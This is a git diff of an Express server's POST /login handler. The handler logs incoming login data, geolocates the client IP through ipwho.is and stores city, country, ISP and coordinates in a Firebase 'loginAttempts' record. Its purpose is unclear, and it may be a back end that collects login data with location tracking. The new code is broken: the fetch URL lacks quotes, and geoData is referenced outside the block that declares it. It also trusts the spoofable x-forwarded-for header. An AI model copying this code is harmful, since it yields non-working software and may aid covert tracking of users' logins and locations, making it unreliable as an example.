@@ -21,23 +21,40 @@ admin.initializeApp({
 const db = admin.database();
 
 // 📡 Login data receive panna
-app.post("/login",async (req, res) => {
+app.post("/login", async (req, res) => {
   const data = req.body;
-const rawIP=req.headers['x-forwarded-for']||req.ip;
-  const ip=rawIP.split(",")[0].trim();
-  let geoData={};
-  try{
-    const geoRes=await fetch('https://ipwho.is/${ip}');
-    geoData=await geoRes.json();
-  }catch(err){
-    console.log("Geo API error:",err);
+
+  const rawIP =
+    req.headers["x-forwarded-for"] ||
+    req.socket.remoteAddress ||
+    req.ip;
+
+  const ip = rawIP ? rawIP.split(",")[0].trim() : "0.0.0.0";
+
+  console.log("IP:", ip);
+
+  let city = "N/A";
+  let country = "N/A";
+
+  try {
+    const geoRes = await fetch(https://ipwho.is/${ip});
+    const geoData = await geoRes.json();
+
+    console.log("GeoData:", geoData);
+
+    if (geoData.success) {
+      city = geoData.city || "N/A";
+      country = geoData.country || "N/A";
+    }
+  } catch (err) {
+    console.log("Geo API error:", err);
   }
   const ref = db.ref("loginAttempts").push();
-  ref.set({
+   await ref.set({
     time: new Date().toLocaleString(),
    ip:ip,
-    country:geoData.country||"N/A",
-    city:geoData.city||"N/A",
+    country:country||"N/A",
+    city:city||"N/A",
     isp:geoData.isp||"N/A",
     lat:geoData.lat||"N/A",
     lon:geoData.lon||"N/A",
